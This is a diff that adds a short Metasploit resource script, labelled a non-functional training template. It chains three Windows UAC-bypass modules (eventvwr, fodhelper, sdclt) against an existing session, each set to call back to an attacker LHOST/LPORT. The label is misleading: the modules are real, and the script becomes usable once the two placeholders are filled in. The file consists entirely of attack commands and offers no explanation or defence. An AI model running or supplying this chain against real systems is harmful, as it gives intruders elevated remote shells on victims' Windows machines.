@@ -1,0 +1,20 @@
+# UAC Bypass Template
+# For Training Use – Non-functional Template
+
+use exploit/windows/local/bypassuac_eventvwr
+set SESSION 1
+set LHOST <LHOST>
+set LPORT <LPORT>
+run
+
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+set LHOST <LHOST>
+set LPORT <LPORT>
+run
+
+use exploit/windows/local/bypassuac_sdclt
+set SESSION 1
+set LHOST <LHOST>
+set LPORT <LPORT>
+run
